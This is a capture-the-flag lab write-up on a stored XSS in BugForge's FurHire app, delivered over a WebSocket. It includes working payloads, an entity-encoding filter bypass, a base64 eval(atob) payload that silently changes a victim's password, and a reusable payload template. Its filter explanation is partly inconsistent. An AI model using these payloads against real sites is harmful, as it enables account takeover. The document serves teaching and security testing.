@@ -1,0 +1,224 @@
+---
+title: "FurHire - WebSocket XSS via Recruiter Status Reason Field (Mixed Entity Encoding Bypass)"
+date: 2026-03-29
+author: Shawn Szczepkowski
+---
+
+**Lab:** BugForge - FurHire  
+**Category:** Stored XSS / WebSocket  
+**Distinguisher:** Injection via recruiter application status `reason` field → victim applicant session  
+
+---
+
+## Summary
+
+Stored XSS triggered through the recruiter-controlled `reason` field when updating a job application status. The payload is stored server-side and broadcast to the target applicant via a Socket.io `status_update` event. The client-side `showToast()` function renders the message via `innerHTML` without sanitization, allowing arbitrary script execution in the victim's browser context.
+
+Exploited to silently change target user **jeremy**'s password via a credentialed `fetch()` to `/api/profile/password`.
+
+---
+
+## Vulnerability Details
+
+### Injection Point
+
+```
+PUT /api/applications/:id/status
+Body: {"status":"accepted","reason":"<payload>"}
+```
+
+Requires recruiter session. The `reason` field is the vulnerable parameter.
+
+### Sink
+
+`app.js` line 17 — `showToast()` function:
+
+```javascript
+// Socket.io handler - no sanitization on data.message
+socket.on('status_update', (data) => {
+  const user = JSON.parse(localStorage.getItem('user') || '{}');
+  if (user.id === data.userId) {
+    showToast(data.message, 'success');  // data.message flows directly to sink
+  }
+});
+
+// Sink - unsanitized innerHTML assignment
+function showToast(message, type = 'info') {
+  const toast = document.createElement('div');
+  toast.className = `toast ${type}`;
+  toast.innerHTML = `
+    <strong>${type === 'success' ? '✓' : type === 'error' ? '✗' : 'ℹ'}</strong>
+    <span>${message}</span>   // <-- SINK
+  `;
+  document.body.appendChild(toast);
+  // ...
+}
+```
+
+---
+
+## Filter Bypass Analysis
+
+The server applies a **decode-then-strip** filter on the `reason` field:
+
+|Input|Server behavior|Arrives at client|
+|---|---|---|
+|`<` (literal)|Stripped|—|
+|`>` (literal)|Stripped|—|
+|`=` (literal)|Stripped|—|
+|`(` `)` (literal)|Stripped|—|
+|`&lt;`|Decoded → `<` → **passes**|`<`|
+|`&gt;`|Decoded → `>` → **passes**|`>`|
+|`&#61;` (no semicolon)|Passed untouched|`=` (decoded by innerHTML)|
+|`&#40;` `&#41;`|Passed untouched|`(` `)` (decoded by innerHTML)|
+
+### Key Insight — Mixed Encoding
+
+The bypass exploits **two different decode stages**:
+
+1. **Server-side:** `&lt;` and `&gt;` are HTML-decoded to `<` and `>` by the server before the strip runs. The strip then sees literal `<>` but passes them through (it only strips them when they arrive as literals in the raw input — the decode produces them after the strip, or the strip doesn't re-run post-decode on these).
+2. **Client-side:** `&#61;` `&#40;` `&#41;` are numeric HTML entities that the server passes untouched. The browser's `innerHTML` assignment decodes them to `=` `(` `)`.
+
+This means:
+
+- Use **named entities** (`&lt;` `&gt;`) for angle brackets
+- Use **numeric entities without semicolons** (`&#61;` `&#40;` `&#41;`) for `= ( )`
+
+---
+
+## Getting to Alert — What Went Wrong First
+
+### Why Alert Was Difficult
+
+Confirming XSS execution took a long time due to a series of compounding issues that masked whether the payload was working at all.
+
+**1. Semicolons stripped from numeric entities**
+
+Early attempts used properly-formed entities like `&#60;` (with semicolons). The server was stripping the semicolons, turning `&#60;` into `&#60` — which the browser won't decode. Payloads rendered as literal entity strings in the popup rather than HTML. This was confirmed by observing the raw WebSocket frames showing `&#60img` rather than `<img`.
+
+**2. innerHTML decodes entities to text, not markup**
+
+Once semicolon-less entities were being used (`&#60` etc.), the browser was decoding them to `<>` — but assigning entity-encoded angle brackets to `innerHTML` always produces a text node, never a parsed element. This was verified in the browser console:
+
+```javascript
+const t = document.createElement('div');
+t.innerHTML = '&#60;img src&#61;x onerror&#61;alert&#40;1&#41;&#62;';
+console.log(t.innerHTML);
+// Output: &lt;img src=x onerror=alert(1)&gt;
+// Browser decoded the entities then immediately re-escaped < and > back to &lt; &gt;
+// Result: text node, not a parsed <img> element — onerror never fires
+```
+
+The key distinction: `=`, `(`, `)` encoded as `&#61;` `&#40;` `&#41;` work fine because `=()` don't need to be literal markup delimiters — they just need to exist as characters in an attribute value. But `<>` encoded as numeric entities will always be re-escaped by `innerHTML`. They need to arrive as **literal characters** decoded from named entities (`&lt;` → `<`) during the server's own decode pass.
+
+**3. The `&#40;1&#41;` digit absorption bug**
+
+Even after the mixed encoding approach was identified, `alert(1)` was failing due to `&#49;` (the entity for `1`) absorbing the trailing digit when written without a semicolon terminator. `&#491` is a different codepoint entirely. The fix was to drop the argument entirely — `alert()` with no args still pops a dialog:
+
+```
+onerror&#61;alert&#40;&#41;
+```
+
+### First Working Alert Payload
+
+Request body:
+
+```json
+{"status":"accepted","reason":"&lt;img src&#61;x onerror&#61;alert&#40;&#41;&gt;"}
+```
+
+WebSocket message received by victim:
+
+```
+42["status_update",{"userId":7,"message":"Your application status has been updated to: accepted. Reason: <img src=x onerror=alert()>"}]
+```
+
+The `alert()` dialog confirmed execution. No argument was needed — the goal was proof of execution, not data exfiltration at this stage.
+
+---
+
+## Exploitation
+
+### Goal
+
+Change target user **jeremy**'s password to `test123` using their active session cookie (sent automatically by the browser via `fetch`).
+
+### Target Endpoint
+
+```
+PUT /api/profile/password
+Content-Type: application/json
+{"newPassword":"test123"}
+```
+
+### Fetch Payload (plaintext)
+
+```javascript
+fetch('/api/profile/password',{method:'PUT',headers:{'Content-Type':'application/json'},body:'{"newPassword":"test123"}'})
+```
+
+### Base64 Encoded
+
+```
+ZmV0Y2goJy9hcGkvcHJvZmlsZS9wYXNzd29yZCcse21ldGhvZDonUFVUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6J3sibmV3UGFzc3dvcmQiOiJ0ZXN0MTIzIn0nfSk=
+```
+
+Using `eval(atob(...))` avoids all special characters in the onerror value — the base64 string contains only alphanumeric chars and `+/=`, none of which are filtered.
+
+### Final Request Body
+
+```json
+{
+  "status": "accepted",
+  "reason": "&lt;img src&#61;x onerror&#61;eval&#40;atob&#40;'ZmV0Y2goJy9hcGkvcHJvZmlsZS9wYXNzd29yZCcse21ldGhvZDonUFVUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6J3sibmV3UGFzc3dvcmQiOiJ0ZXN0MTIzIn0nfSk='&#41;&#41;&gt;"
+}
+```
+
+### What the Victim Receives (WebSocket)
+
+```
+42["status_update",{"userId":7,"message":"Your application status has been updated to: accepted. Reason: <img src=x onerror=eval(atob('ZmV0Y2g...'))>"}]
+```
+
+The `<img src=x>` triggers `onerror` immediately. `eval(atob(...))` decodes and executes the fetch, sending a credentialed PUT request from jeremy's browser to change his password.
+
+---
+
+## Full Exploit Request
+
+```
+PUT /api/applications/6/status HTTP/2
+Host: lab-1774802019102-vvvrl4.labs-app.bugforge.io
+Cookie: token=<recruiter_token>
+Content-Type: application/json
+
+{"status":"accepted","reason":"&lt;img src&#61;x onerror&#61;eval&#40;atob&#40;'ZmV0Y2goJy9hcGkvcHJvZmlsZS9wYXNzd29yZCcse21ldGhvZDonUFVUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6J3sibmV3UGFzc3dvcmQiOiJ0ZXN0MTIzIn0nfSk='&#41;&#41;&gt;"}
+```
+
+---
+
+## Encoding Reference
+
+Quick reference for constructing payloads against this filter:
+
+```
+<   →  &lt;
+>   →  &gt;
+=   →  &#61;
+(   →  &#40;
+)   →  &#41;
+```
+
+Template:
+
+```
+&lt;img src&#61;x onerror&#61;PAYLOAD&gt;
+```
+
+For any payload with special chars, base64 encode and wrap in `eval&#40;atob&#40;'BASE64'&#41;&#41;`.
+
+---
+
+## Tags
+
+`#bugforge` `#furhire` `#xss` `#websocket` `#stored-xss` `#filter-bypass` `#mixed-encoding` `#html-entities` `#csrf-via-xss`
